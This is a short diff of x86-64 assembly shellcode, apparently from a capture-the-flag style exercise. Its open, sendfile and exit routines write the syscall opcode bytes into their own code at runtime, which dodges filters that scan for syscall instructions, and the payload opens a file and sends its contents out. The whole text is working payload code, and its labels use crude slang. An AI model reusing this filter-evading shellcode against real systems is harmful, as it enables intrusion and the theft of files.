@@ -20,9 +20,9 @@ open:
 	xor rdx, rdx
 	// 0f 05
 	//inc word ptr [cocks]
-	movw [cocks], 0x050f
+	movb [cocks], 0x0f
 	//syscall
-cocks:	.byte 0xff, 0xff
+cocks:	.byte 0x05, 0x05
 	push rax
 
 sendfile:
@@ -38,13 +38,13 @@ sendfile:
 
 	mov	al, 40
 
-	movw [dicks], 0x050f
-dicks: .byte 0xff, 0xff
+	movb [dicks], 0x0f
+dicks: .byte 0x05, 0x05
 exit:	//exit
 	mov 	al, 60
 	xor	rdi, rdi
 
 
-	movw [pricks], 0x050f
-pricks: .byte 0xff, 0xff
+	movb [pricks], 0x0f
+pricks: .byte 0x05, 0x05
 
